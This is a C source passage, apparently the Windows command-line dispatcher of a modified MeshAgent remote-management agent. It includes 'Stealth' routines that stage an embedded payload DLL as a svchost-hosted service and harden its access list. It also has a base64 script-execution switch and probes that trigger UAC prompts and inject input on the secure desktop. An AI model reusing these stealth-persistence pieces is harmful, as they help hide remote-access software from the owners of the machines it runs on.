			return nativeServiceCmdResult;
		}
	}

	if (argc > 1 && (strcasecmp(argv[1], "-finstall") == 0 || strcasecmp(argv[1], "-funinstall") == 0 ||
		strcasecmp(argv[1], "-fulluninstall") == 0 || strcasecmp(argv[1], "-fullinstall") == 0 ||
		strcasecmp(argv[1], "-fullupdate") == 0 || strcasecmp(argv[1], "-fupdate") == 0 ||
		strcasecmp(argv[1], "-fullregression") == 0 ||
		strcasecmp(argv[1], "-validate-install") == 0 || strcasecmp(argv[1], "--validate-install") == 0 ||
		strcasecmp(argv[1], "-validate-update") == 0 || strcasecmp(argv[1], "--validate-update") == 0 ||
		strcasecmp(argv[1], "-validate-uninstall") == 0 || strcasecmp(argv[1], "--validate-uninstall") == 0 ||
		strcasecmp(argv[1], "-validate-package") == 0 || strcasecmp(argv[1], "--validate-package") == 0 ||
		strcasecmp(argv[1], "-preprotection-capture") == 0 || strcasecmp(argv[1], "--preprotection-capture") == 0 ||
		strcasecmp(argv[1], "-state") == 0 ||
		strcasecmp(argv[1], "--selftest") == 0 || strncasecmp(argv[1], "--selftest=", 11) == 0))
	{
		argv[argc] = argv[1];
		argv[1] = (char*)ILibMemory_SmartAllocate(4);
		sprintf_s(argv[1], ILibMemory_Size(argv[1]), "run");
		argc += 1;
	}

	/*
#ifndef NOMESHCMD
	// Check if this is a Mesh command operation
	if (argc >= 1 && strlen(argv[0]) >= 7 && strcasecmp(argv[0] + strlen(argv[0]) - 7, "meshcmd") == 0) return MeshCmd_ProcessCommand(argc, argv, 1);
	if (argc >= 2 && strcasecmp(argv[1], "meshcmd") == 0) return MeshCmd_ProcessCommand(argc, argv, 2);
#endif
	*/

	//CoInitializeEx(NULL, COINIT_MULTITHREADED);
    // Register svchost-hosted service DLL
	if (argc > 1 && strcasecmp(argv[1], "-svchost-register") == 0)
	{
		WCHAR wTempDll[MAX_PATH * 2] = {0};
		WCHAR wSvcName[256] = {0};
		StealthInstallPaths paths;
		BOOL ok = FALSE;
		BOOL removeTemp = FALSE;
		BOOL hasExternalSource = (argc > 2 && argv[2] != NULL && argv[2][0] != 0);
		BOOL stagedFromEmbedded = FALSE;

		MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
		if (wSvcName[0] == L'\0')
		{
			wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
		}

		if (hasExternalSource)
		{
			if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wTempDll, (int)_countof(wTempDll)) <= 0)
			{
				printf("[!] Unable to convert DLL path '%s' to Unicode\n", argv[2]);
				return 1;
			}

			if (GetFileAttributesW(wTempDll) == INVALID_FILE_ATTRIBUTES)
			{
				wprintf(L"[!] Source DLL not found: %s\n", wTempDll);
				return 1;
			}
		}

		if (!Stealth_GetInstallPaths(&paths))
		{
			printf("[!] Failed to resolve installation paths\n");
			return 1;
		}
		if (!Stealth_CreateInstallRootDirectory(paths.installDir))
		{
			wprintf(L"[!] Failed to create installation directory: %s\n", paths.installDir);
			return 1;
		}
		// Best-effort create of logs directory (non-fatal)
		Stealth_CreateInstallationDirectory(paths.logsDir);

		if (paths.dllPath[0] == L'\0')
		{
			if (paths.installDir[0] == L'\0')
			{
				wprintf(L"[!] Unable to determine svchost DLL destination\n");
				return 1;
			}
			wcscpy_s(paths.dllPath, _countof(paths.dllPath), paths.installDir);
			size_t dirLen = wcslen(paths.dllPath);
			if (dirLen > 0 && paths.dllPath[dirLen - 1] != L'\\' && paths.dllPath[dirLen - 1] != L'/')
			{
				wcscat_s(paths.dllPath, _countof(paths.dllPath), L"\\");
			}
			wcscat_s(paths.dllPath, _countof(paths.dllPath), STEALTH_FALLBACK_DLL_NAME);
		}

		if (hasExternalSource)
		{
			if (!Stealth_InstallFiles(wTempDll, paths.dllPath))
			{
				wprintf(L"[!] Failed to copy DLL to %s\n", paths.dllPath);
				return 1;
			}
			removeTemp = (_wcsicmp(wTempDll, paths.dllPath) != 0);
		}
		else
		{
			if (!MeshSvchostPayload_WriteToPath(paths.dllPath))
			{
				Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
				return 1;
			}
			wprintf(L"[+] Embedded payload staged at %s\n", paths.dllPath);
		}

		ok = Stealth_RegisterSvchostService(wSvcName, paths.dllPath);
		if (ok)
		{
			if (!MeshService_HardenServiceDaclByName(wSvcName))
			{
				Stealth_DebugPrintfW(L"[svchost-register] Failed to apply hardened DACL (see debug output)");
			}
		}
		printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");

		if (removeTemp)
		{
			DeleteFileW(wTempDll);
		}
		return ok ? 0 : 1;
	}

    // Unregister svchost-hosted service
    if (argc > 1 && strcasecmp(argv[1], "-svchost-unregister") == 0)
    {
        WCHAR wSvcName[256] = {0};
        MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
        if (wSvcName[0] == L'\0')
        {
            wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
        }
        BOOL ok = Stealth_UnregisterSvchostService(wSvcName);
        printf(ok ? "[+] Svchost unregistration successful\n" : "[!] Svchost unregistration failed\n");
        return ok ? 0 : 1;
    }

    // Status: print registry + svchost membership + current service state
    if (argc > 1 && strcasecmp(argv[1], "-svchost-status") == 0)
    {
        return MeshService_RunSvchostStatusCommand();
    }

#if defined(_LINKVM)
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-hardening-probe") == 0)
	{
		const WCHAR* dllPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmBridgeHardeningProbeCommand(dllPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-job-controller") == 0)
	{
		const WCHAR* dllPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		const WCHAR* inputPipeName = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
		const WCHAR* outputPipeName = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
		return MeshService_RunKvmBridgeJobControllerCommand(dllPath, inputPipeName, outputPipeName);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-session-change-probe") == 0)
	{
		return MeshService_RunKvmBridgeSessionChangeProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-session-change-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmBridgeSessionChangeProbeChildCommand(reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-crash-recovery-probe") == 0)
	{
		return MeshService_RunKvmBridgeCrashRecoveryProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-crash-recovery-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmBridgeCrashRecoveryProbeChildCommand(reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-event-audit-probe") == 0)
	{
		return MeshService_RunKvmBridgeEventAuditProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-connect-delay-probe") == 0)
	{
		DWORD connectDelayMs = (argc > 2) ? (DWORD)strtoul(argv[2], NULL, 10) : 2000UL;
		return MeshService_RunKvmBridgeConnectDelayProbeCommand(connectDelayMs);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-multi-session-probe") == 0)
	{
		DWORD primarySessionId = (argc > 2) ? (DWORD)strtoul(argv[2], NULL, 10) : MeshService_GetCurrentSessionId();
		int secondaryTsid = (argc > 3) ? (int)strtol(argv[3], NULL, 10) : -1;
		return MeshService_RunKvmMultiSessionProbeCommand(primarySessionId, secondaryTsid);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-bridge-event-audit-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmBridgeEventAuditProbeChildCommand(reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-secure-desktop-probe") == 0)
	{
		return MeshService_RunKvmSecureDesktopProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-probe") == 0)
	{
		return MeshService_RunKvmElevatedInputProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmElevatedInputProbeChildCommand(reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-elevated-input-target") == 0)
	{
		const WCHAR* hwndReportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		const WCHAR* readyReportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
		const WCHAR* capturePath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
		const WCHAR* title = (wideArgv != NULL && argc > 5) ? wideArgv[5] : NULL;
		return MeshService_RunKvmElevatedInputTargetCommand(hwndReportPath, readyReportPath, capturePath, title);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-target") == 0)
	{
		const WCHAR* hwndReportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		const WCHAR* readyReportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
		const WCHAR* capturePath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
		const WCHAR* title = (wideArgv != NULL && argc > 5) ? wideArgv[5] : NULL;
		return MeshService_RunKvmBlockInputTargetCommand(hwndReportPath, readyReportPath, capturePath, title);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-probe") == 0)
	{
		return MeshService_RunKvmBlockInputProbeCommand();
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		return MeshService_RunKvmBlockInputProbeChildCommand(reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-blockinput-holder") == 0)
	{
		const WCHAR* readyPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		const WCHAR* releasePath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
		const WCHAR* reportPath = (wideArgv != NULL && argc > 4) ? wideArgv[4] : NULL;
		return MeshService_RunKvmBlockInputHolderCommand(readyPath, releasePath, reportPath);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-secure-desktop-probe-child") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		DWORD timeoutMs = (argc > 3) ? (DWORD)strtoul(argv[3], NULL, 10) : 20000;
		return MeshService_RunKvmSecureDesktopProbeChildCommand(reportPath, timeoutMs);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-uac-consent-trigger") == 0)
	{
		const WCHAR* reportPath = (wideArgv != NULL && argc > 2) ? wideArgv[2] : NULL;
		DWORD timeoutMs = (argc > 3) ? (DWORD)strtoul(argv[3], NULL, 10) : 15000;
		return MeshService_RunKvmUacConsentTriggerCommand(reportPath, timeoutMs);
	}
	if (argc > 1 && strcasecmp(argv[1], "-kvm-uac-consent-target") == 0)
	{
		DWORD sleepMs = (argc > 2) ? (DWORD)strtoul(argv[2], NULL, 10) : 1000;
		const WCHAR* reportPath = (wideArgv != NULL && argc > 3) ? wideArgv[3] : NULL;
		return MeshService_RunKvmUacConsentTargetCommand(sleepMs, reportPath);
	}
#endif

    if (argc > 1 && strcasecmp(argv[1], "-licenses") == 0)
	{
		printf("========================================================================================\n");
		printf(" MeshCentral MeshAgent: Copyright 2006 - 2022 Intel Corporation\n");
		printf("                        https://github.com/Ylianst/MeshAgent \n");
		printf("----------------------------------------------------------------------------------------\n");
		printf("   Licensed under the Apache License, Version 2.0 (the \"License\");\n");
		printf("   you may not use this file except in compliance with the License.\n");
		printf("   You may obtain a copy of the License at\n");
		printf("   \n");
		printf("   http://www.apache.org/licenses/LICENSE-2.0\n");
		printf("   \n");
		printf("   Unless required by applicable law or agreed to in writing, software\n");
		printf("   distributed under the License is distributed on an \"AS IS\" BASIS,\n");
		printf("   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n");
		printf("   See the License for the specific language governing permissions and\n");
		printf("   limitations under the License.\n\n");
		printf("========================================================================================\n");
		printf(" Duktape Javascript Engine: Copyright (c) 2013-2019 by Duktape authors (see AUTHORS.rst)\n");
		printf("                        https://github.com/svaarala/duktape \n");
		printf("                        http://opensource.org/licenses/MIT \n");
		printf("----------------------------------------------------------------------------------------\n");
		printf("   Permission is hereby granted, free of charge, to any person obtaining a copy\n");
		printf("   of this software and associated documentation files(the \"Software\"), to deal\n");
		printf("   in the Software without restriction, including without limitation the rights\n");
		printf("   to use, copy, modify, merge, publish, distribute, sublicense, and / or sell\n");
		printf("   copies of the Software, and to permit persons to whom the Software is\n");
		printf("   furnished to do so, subject to the following conditions :\n");
		printf("   \n");
		printf("   The above copyright notice and this permission notice shall be included in\n");
		printf("   all copies or substantial portions of the Software.\n");
		printf("   \n");
		printf("   THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n");
		printf("   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n");
		printf("   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE\n");
		printf("   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n");
		printf("   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n");
		printf("   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n");
		printf("   THE SOFTWARE.\n");
		printf("========================================================================================\n");
		printf("ZLIB Data Compression Library: Copyright (c) 1995-2017 Jean-loup Gailly and Mark Adler\n");
		printf("                               http://www.zlib.net \n");
		printf("----------------------------------------------------------------------------------------\n");
		printf("   This software is provided 'as-is', without any express or implied\n");
		printf("   warranty.In no event will the authors be held liable for any damages\n");
		printf("   arising from the use of this software.\n");
		printf("\n");
		printf("   Permission is granted to anyone to use this software for any purpose,\n");
		printf("   including commercial applications, and to alter it and redistribute it\n");
		printf("   freely, subject to the following restrictions :\n");
		printf("\n");
		printf("   1. The origin of this software must not be misrepresented; you must not\n");
		printf("      claim that you wrote the original software.If you use this software\n");
		printf("      in a product, an acknowledgment in the product documentation would be\n");
		printf("      appreciated but is not required.\n");
		printf("   2. Altered source versions must be plainly marked as such, and must not be\n");
		printf("      misrepresented as being the original software.\n");
		printf("   3. This notice may not be removed or altered from any source distribution.\n");
		printf("\n");
		printf("   Jean - loup Gailly        Mark Adler\n");
		printf("   jloup@gzip.org            madler@alumni.caltech.edu\n");

#ifdef WIN32
		wmain_free(argv);
#endif
		return(0);
	}
	char *integratedJavaScript = NULL;
	int integragedJavaScriptLen = 0;

	if (argc > 1 && strcasecmp(argv[1], "-info") == 0)
	{
		printf("Compiled on: %s, %s\n", __TIME__, __DATE__);
		if (SOURCE_COMMIT_HASH != NULL && SOURCE_COMMIT_DATE != NULL)
		{
			printf("   Commit Hash: %s\n", SOURCE_COMMIT_HASH);
			printf("   Commit Date: %s\n", SOURCE_COMMIT_DATE);
		}
#ifndef MICROSTACK_NOTLS
		printf("Using %s\n", SSLeay_version(SSLEAY_VERSION));
#endif
		printf("Agent ARCHID: %d\n", MESH_AGENTID);
		char script[] = "var _tmp = 'Detected OS: ' + require('os').Name; try{_tmp += (' - ' + require('os').arch());}catch(x){}console.log(_tmp);if(process.platform=='win32'){ _tmp=require('win-authenticode-opus')(process.execPath); if(_tmp!=null && _tmp.url!=null){ _tmp=require('win-authenticode-opus').locked(_tmp.url); if(_tmp!=null) { console.log('LOCKED to: ' + _tmp.dns); console.log(' => ' + _tmp.id); } } } process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}

	if (argc > 2 && strcasecmp(argv[1], "-faddr") == 0)
	{
#ifdef WIN64
		uint64_t addrOffset = 0;
		sscanf_s(argv[2] + 2, "%016llx", &addrOffset);
#else
		uint32_t addrOffset = 0;
		sscanf_s(argv[2] + 2, "%x", &addrOffset);
#endif
		ILibChain_DebugOffset(ILibScratchPad, sizeof(ILibScratchPad), (uint64_t)addrOffset);
		printf("%s", ILibScratchPad);
		wmain_free(argv);
		return(0);
	}

	if (argc > 2 && strcasecmp(argv[1], "-fdelta") == 0)
	{
		uint64_t delta = 0;
		sscanf_s(argv[2], "%lld", &delta);
		ILibChain_DebugDelta(ILibScratchPad, sizeof(ILibScratchPad), delta);
		printf("%s", ILibScratchPad);
		wmain_free(argv);
		return(0);
	}

	if (integratedJavaScript == NULL || integragedJavaScriptLen == 0)
	{
		ILibDuktape_ScriptContainer_CheckEmbedded(&integratedJavaScript, &integragedJavaScriptLen);
	}

	if (argc > 1 && strcmp(argv[1], "-export") == 0 && integragedJavaScriptLen == 0)
	{
		integratedJavaScript = ILibString_Copy("require('code-utils').expand({embedded: true});process.exit();", 0);
		integragedJavaScriptLen = (int)strnlen_s(integratedJavaScript, sizeof(ILibScratchPad));
	}
	if (argc > 1 && strcmp(argv[1], "-import") == 0 && integragedJavaScriptLen == 0)
	{
		integratedJavaScript = ILibString_Copy("require('code-utils').shrink();process.exit();", 0);
		integragedJavaScriptLen = (int)strnlen_s(integratedJavaScript, sizeof(ILibScratchPad));
	}

	if (argc > 2 && strcmp(argv[1], "-exec") == 0 && integragedJavaScriptLen == 0)
	{
		integratedJavaScript = ILibString_Copy(argv[2], 0);
		integragedJavaScriptLen = (int)strnlen_s(integratedJavaScript, sizeof(ILibScratchPad));
	}
	if (argc > 2 && strcmp(argv[1], "-b64exec") == 0 && integragedJavaScriptLen == 0)
	{
		integragedJavaScriptLen = ILibBase64Decode((unsigned char *)argv[2], (const int)strnlen_s(argv[2], sizeof(ILibScratchPad2)), (unsigned char**)&integratedJavaScript);
	}
	if (argc > 1 && strcasecmp(argv[1], "-nodeid") == 0)
	{
		char script[] = "console.log(require('_agentNodeId')());process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc > 1 && strcasecmp(argv[1], "-name") == 0)
	{
		char script[] = "console.log(require('_agentNodeId').serviceName());process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc > 1 && (strcasecmp(argv[1], "exstate") == 0))
	{
		char script[] = "var r={rawState: -1, state: 'NOT INSTALLED'};try{r=require('service-manager').manager.getService(require('_agentNodeId').serviceName()).status;}catch(z){};console.log(r.state);process.exit(r.rawState);";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc > 1 && (strcasecmp(argv[1], "state") == 0))
	{
		char script[] = "try{console.log(require('service-manager').manager.getService(require('_agentNodeId').serviceName()).status.state);}catch(z){console.log('NOT INSTALLED');};process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc > 1 && strcasecmp(argv[1], "-agentHash") == 0 && integragedJavaScriptLen == 0)
	{
		char script[] = "console.log(getSHA384FileHash(process.execPath).toString('hex').substring(0,16));process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc > 1 && strcasecmp(argv[1], "-agentFullHash") == 0 && integragedJavaScriptLen == 0)
	{
		char script[] = "console.log(getSHA384FileHash(process.execPath).toString('hex'));process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	if (argc == 2 && (strcasecmp(argv[1], "-resetnodeid") == 0))
	{
		// Set "resetnodeid" in registry
		char script[] = "try{require('_agentNodeId').resetNodeId();}catch(z){console.log('This command requires admin.');}process.exit();";
		integratedJavaScript = ILibString_Copy(script, sizeof(script) - 1);
		integragedJavaScriptLen = (int)sizeof(script) - 1;
	}
	CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (argc > 1 && strcasecmp(argv[1], "-updaterversion") == 0)
	{
		DWORD dummy;
		HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
		if (h != NULL && h != INVALID_HANDLE_VALUE)
		{
			WriteFile(h, "1\n", 2, &dummy, NULL);
		}
		wmain_free(argv);
		return(0);
	}
#if defined(_LINKVM)
	if (argc > 1 && (strcasecmp(argv[1], "-kvm0") == 0 || strcasecmp(argv[1], "-kvm1") == 0))
	{
		int pauseMode = (strcasecmp(argv[1], "-kvm1") == 0) ? 1 : 0;
		void **parm = NULL;
		int isRundll32 = MeshService_IsRunningUnderRundll32();

		if (!isRundll32)
		{
			fprintf(stderr, "MeshAgent: direct KVM slave execution is disabled. Use rundll32.exe <bridge-dll>,KvmSessionBridgeW <inputPipe> <outputPipe> [-kvm0|-kvm1].\r\n");
			wmain_free(argv);
			return ERROR_NOT_SUPPORTED;
		}

		parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
		parm[0] = kvm_serviceWriteSink;
		((int*)&(parm[2]))[0] = pauseMode;
		((int*)&(parm[3]))[0] = (argc > 2 && strcasecmp(argv[2], "-coredump") == 0) ? 1 : 0;
		if ((argc > 2 && strcasecmp(argv[2], "-remotecursor") == 0) ||
			(argc > 3 && strcasecmp(argv[3], "-remotecursor") == 0))
		{
			gRemoteMouseRenderDefault = 1;
		}

		// This is only supported on Windows 8 / Windows Server 2012 R2 and newer
		HMODULE shCORE = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
		DpiAwarenessFunc dpiAwareness = NULL;
		if (shCORE != NULL)
		{
			if ((dpiAwareness = (DpiAwarenessFunc)GetProcAddress(shCORE, (LPCSTR)"SetProcessDpiAwareness")) == NULL)
			{
				FreeLibrary(shCORE);
				shCORE = NULL;
			}
		}
		if (dpiAwareness != NULL)
		{
			dpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
			FreeLibrary(shCORE);
			shCORE = NULL;
		}
		else
		{
			SetProcessDPIAware();
		}
		kvm_server_mainloop((void*)parm);
		wmain_free(argv);
		return 0;
	}
#endif	
	if (integratedJavaScript != NULL || (argc > 0 && strcasecmp(argv[0], "--slave") == 0) || (argc > 1 && ((strcasecmp(argv[1], "run") == 0) || (strcasecmp(argv[1], "connect") == 0) || (strcasecmp(argv[1], "--slave") == 0))))
	{
		int isSlave = MeshService_HasArg(argc, argv, "--slave");
		int isStandaloneRun = MeshService_HasArg(argc, argv, "run") || MeshService_HasArg(argc, argv, "connect");
		int isManaged = MeshService_IsManagedConsoleOperation(argc, argv);

		// Service-only policy: disallow running a full standalone agent in svchost builds, but do not
		// block managed service helpers such as installer operations or IPC tooling.
#if defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
		if (isStandaloneRun && !isSlave && !isManaged)
		{
			wchar_t svcName[256] = { 0 };
			MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), svcName, _countof(svcName));
			if (svcName[0] == L'\0') { StringCchCopyW(svcName, _countof(svcName), STEALTH_FALLBACK_SERVICE_NAME); }
			printf("MeshAgent: standalone execution is disabled in this build. Start the service '%S'.\r\n", svcName);
			wmain_free(argv);
			return ERROR_NOT_SUPPORTED;
		}
#endif

		// Run the mesh agent in console mode, since the agent is compiled for windows service, the KVM will not work right. This is only good for testing.
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE); // Set SIGNAL on windows to listen for Ctrl-C

		BOOL enableResilience = (isManaged == 0);
		__try
		{
			int capabilities = 0;
			if (argc > 1 && ((strcasecmp(argv[1], "connect") == 0))) { capabilities = MeshCommand_AuthInfo_CapabilitiesMask_TEMPORARY; }
			agent = MeshAgent_Create(capabilities);
			agent->meshCoreCtx_embeddedScript = integratedJavaScript;
			agent->meshCoreCtx_embeddedScriptLen = integragedJavaScriptLen;
			if (integratedJavaScript != NULL || (argc > 1 && (strcasecmp(argv[1], "run") == 0 || strcasecmp(argv[1], "connect") == 0))) { agent->runningAsConsole = 1; }
			if (enableResilience) { MeshService_ActivateResilience(); }
			MeshAgent_Start(agent, argc, argv);
			retCode = agent->exitCode;
			MeshAgent_Destroy(agent);
			agent = NULL;
		}
		__except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException))
		{
			ILib_WindowsExceptionDebugEx(&winException);
		}
		if (enableResilience) { MeshService_DeactivateResilience(); }
		wmain_free(argv);
		return(retCode);
	}
#ifndef _MINCORE
	else if (argc > 1 && (strcasecmp(argv[1], "-netinfo") == 0))
	{
		char* data;
		int len = MeshInfo_GetSystemInformation(&data);
		if (len > 0) { printf_s(data); }
	}
#endif
	else
	{
		int skip = 0;

		// Tooling/script invocations are explicit console workflows. Handle them
		// before attempting service dispatch so harnesses do not block inside
		// StartServiceCtrlDispatcher() waiting for a service controller path that
		// will never materialize for ad hoc .js/.zip runs.
		if (argc >= 2 && (ILibString_EndsWith(argv[1], -1, ".js", 3) != 0 || ILibString_EndsWith(argv[1], -1, ".zip", 4) != 0))
		{
			SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE); // Set SIGNAL on windows to listen for Ctrl-C

			__try
			{
				agent = MeshAgent_Create(0);
				agent->runningAsConsole = 1;
				MeshAgent_Start(agent, argc, argv);
				MeshAgent_Destroy(agent);
				agent = NULL;
			}
			__except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException))
			{
				ILib_WindowsExceptionDebugEx(&winException);
			}

			wmain_free(argv);
			return(0);
		}

		// See if we are running as a service
		if (RunService(argc, argv) == 0 && GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
		{
			// Not running as service, so check if we need to run as a script engine
			if (argc >= 2 && (ILibString_EndsWith(argv[1], -1, ".js", 3) != 0 || ILibString_EndsWith(argv[1], -1, ".zip", 4) != 0))
			{
				SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE); // Set SIGNAL on windows to listen for Ctrl-C

				__try
				{
					agent = MeshAgent_Create(0);
					agent->runningAsConsole = 1;
					// Script-host invocations are tooling/test flows, not persistent service
					// executions. Do not attach watchdog/resilience processes here or the
					// harness may never terminate cleanly after the script completes.
					MeshAgent_Start(agent, argc, argv);
					MeshAgent_Destroy(agent);
					agent = NULL;
				}
				__except (ILib_WindowsExceptionFilterEx(GetExceptionCode(), GetExceptionInformation(), &winException))
				{
					ILib_WindowsExceptionDebugEx(&winException);
				}
			}
			else
			{
				if (argc == 2 && strcmp(argv[1], "-lang") == 0)
				{
					char *lang = NULL;
					char selfexe[_MAX_PATH];
					WCHAR wselfexe[MAX_PATH];
					GetModuleFileNameW(NULL, wselfexe, sizeof(wselfexe) / 2);
					ILibWideToUTF8Ex(wselfexe, -1, selfexe, (int)sizeof(selfexe));


					void *dialogchain = ILibCreateChain();
					ILibChain_PartialStart(dialogchain);
					duk_context *ctx = ILibDuktape_ScriptContainer_InitializeJavaScriptEngineEx(0, 0, dialogchain, NULL, NULL, selfexe, NULL, NULL, dialogchain);
					if (duk_peval_string(ctx, "require('util-language').current.toUpperCase().split('-').join('_');") == 0)
					{
						lang = (char*)duk_safe_to_string(ctx, -1);
						printf("Current Language: %s\n", lang);
					}

					Duktape_SafeDestroyHeap(ctx);
					ILibStopChain(dialogchain);
					ILibStartChain(dialogchain);
					argc = 1;
					skip = 1;
				}
				if (argc == 2 && strlen(argv[1]) > 6 && strncmp(argv[1], "-lang=", 6) == 0)
				{
					DIALOG_LANG = argv[1] + 1 + ILibString_IndexOf(argv[1], strlen(argv[1]), "=", 1);
					argc = 1;
				}

				if (argc != 1)
				{
					printf("Mesh Agent available switches:\r\n");
					printf("\r\n");
					printf("General:\r\n");
					printf("  run                   Start as a console agent.\r\n");
					printf("  connect               Start as a temporary console agent.\r\n");
					printf("  start                 Start the service.\r\n");
					printf("  restart               Restart the service.\r\n");
					printf("  stop                  Stop the service.\r\n");
					printf("  state                 Display the running state of the service.\r\n");
					printf("  -signcheck            Perform self-check.\r\n");
					printf("  -nodeid               Return the current agent identifier.\r\n");
					printf("  -info                 Return agent version information.\r\n");
					printf("  -resetnodeid          Reset the NodeID next time the service is started.\r\n");
					printf("\r\n");
					printf("Install / Update / Uninstall:\r\n");
					printf("  -fullinstall          Copy agent into program files, install and launch (svchost-only).\r\n");
					printf("  -fullupdate           In-place update/repair of an existing svchost install.\r\n");
					printf("  -fulluninstall        Stop agent and clean up the program files location.\r\n");
					printf("  -fullregression       Run full end-to-end regression (install/validate/self-test/update/uninstall).\r\n");
					printf("\r\n");
					printf("Validation / Troubleshooting:\r\n");
					printf("  -validate-install     Validate registry/firewall/DACL/persistence for installed state.\r\n");
					printf("  -validate-update      Validate registry/firewall/DACL/persistence after update.\r\n");
					printf("  -validate-uninstall   Validate cleanup after uninstall.\r\n");
					printf("  -validate-package     Validate package sidecars/preflight and emit JSON.\r\n");
					printf("  -preprotection-capture Capture a timestamped pre-protection desktop artifact and emit JSON.\r\n");
